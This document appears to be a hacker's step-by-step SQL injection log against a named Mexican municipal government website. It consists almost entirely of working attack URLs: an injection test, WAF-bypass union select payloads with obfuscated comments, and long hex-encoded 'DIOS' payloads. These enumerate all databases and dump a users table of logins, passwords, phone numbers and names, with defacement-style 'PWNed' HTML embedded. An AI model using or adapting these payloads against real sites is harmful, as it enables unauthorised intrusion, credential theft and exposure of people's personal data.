### Dork

- `https[:]//www[.]puertomorelos[.]gob[.]mx/detys[.]php?id=11`

### Injection Vulnerability

- `https://www.puertomorelos.gob.mx/detys.php?id=11--+-`

### Count - WAF Bypass - `order by`

- `https://www.puertomorelos.gob.mx/detys.php?id=11 /*!50000ORDER*//**//*!50000BY*/ 14 --+-`

### Vulnerable Column - WAF bypass - `union select`

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,4,5,6,7,8,9,10,11,12,13,14 --+-`

### Simple Concat Info - WAF Bypass

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!50000cOnCat*/(database(),user(),version()),5,6,7,8,9,10,11,12,13,14 --+-`

### HTML Injection Concat Info PoC - WAF Bypass

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!50000cOnCat*/(0x596f20736f79206c61206e6f636865,0x3c62723e,0x3c62723e,database(),0x3c62723e,user(),0x3c62723e,version()),5,6,7,8,9,10,11,12,13,14 --+-`

### Fz3r0 DIOS - WAF Bypass (El truco está en ofuscar el `concat` y el `from`.... y mucho... mucho encoding... )

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,/*!00000concat*/(0x3c666f6e7420666163653d226d6f6e61636f22207374796c653d22636f6c6f723a7265643b746578742d736861646f773a307078203170782035707820233030303b666f6e742d73697a653a36307078223e496e6a656374656420627920467a3372303c62723e44494f5320486563686f20656e204d657869636f3c2f666f6e743e3c62723e3c62723e3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e67223e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e3c62723e5175652065737465206d656e73616a6520686167612065636f206465206c6f7320677269746f7320646573646520656c20496e6672616d756e646f2e3c62723e3c62723e507565646f2065736375636861726c6f73206861626c616e646f6d6520646573646520656c20496e666965726e6f2e2e2e2048617920756e206d6f6e737472756f2064656e74726f206465206d692e3c62723e3c62723e4375696461646f2e2e2e206573612062726563686120656e206c61207075657274612e2e2e203c62723e657320756e61207265616c69646164206170617274652e2e2e203c62723e3c62723e456c20756e69636f20796f20736f7920796f203c62723e3f45737461732073656775726f2071756520656c20756e69636f20747520657265732074753f3c62723e3c62723e4d75792070726f6e746f206c617320636f6d7075657274617320646520756e61206e756576612064696d656e73696f6e207365206162726972616e2e3c62723e3c62723e486173207369646f20656c656769646f2e3c2f666f6e743e3c62723e3c62723e2e3c62723e2e3c62723e2e3c666f6e7420636f6c6f723d7265642073697a653d393e4461746120426173652050574e65642121213c62723e3c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d626c61636b2073697a653d353e4e6f6d62726520646520444220203a2020,database(),0x3c62723e56657273696f6e20646520444220203a2020,version(),0x3c62723e41646d696e6973747261646f7220646520444220203a2020,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)),5,6,7,8,9,10,11,12,13,14 --+-`

### Fz3r0 DIOS / Databases List Dump - WAF Bypass (El truco está en ofuscar el `concat` y el `from`)

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,(SELECT+(@x)%20/*!00000from*/%20(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)%20/*!00000from*/%20(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=/*!00000concat*/(@x,0x3c666f6e7420636f6c6f723d7265642073697a653d363e436f6e74656f206465204261736573206465204461746f7320656e205365727669646f722050574e6564212121213c62723e3c62723e3c696d67207372633d68747470733a2f2f6c6174616d2e6165746e2e636f6d2f5448432f6e6f7469636961732f323730382e482e4e322e44696f736573352e4a50472077696474683d22323230223e3c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d626c75652073697a653d363e3c62723e,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e3c62723e,0x3c2f666f6e743e))))x),5,6,7,8,9,10,11,12,13,14 --+-`

### Data Dump - WAF Bypass (Using DIOS dumped info) - `Users`

- `https://www.puertomorelos.gob.mx/detys.php?id=-11/*!50000%55nIoN*/ /*!50000%53eLeCt*/1,2,3,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(_usuarios)WHERE(@x)IN(@x:=/*!00000concat*/(0x20,@x,0x3c666f6e7420636f6c6f723d7265642073697a653d373e5573756172696f20792050617373776f72642050574e65642121213c62723e3c696d67207372633d68747470733a2f2f75706c6f61642e77696b696d656469612e6f72672f77696b6970656469612f636f6d6d6f6e732f7468756d622f372f37362f4168507563682e6a70672f31353070782d4168507563682e6a70673e3c62723e3c2f666f6e743e3c666f6e7420636f6c6f723d626c75652073697a653d353e,nom_session,0x3c62723e,0x3a,passw,0x3c62723e,0x3a,id_perfil,0x3c62723e,0x3a,tipo,0x3c62723e,0x3a,cel,0x3c62723e,0x3a,cargo,0x3c62723e,0x3a,nom,0x3c62723e,0x3a,a_p,0x3c62723e,0x3a,a_m,0x3c62723e,0x3c2f666f6e743e,0x3c62723e,0x3c62723e))))x),5,6,7,8,9,10,11,12,13,14 --+-`

---

### Media

- `<img src=https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/AhPuch.jpg/150px-AhPuch.jpg>`
- `<img src=https://latam.aetn.com/THC/noticias/2708.H.N2.Dioses5.JPG>`


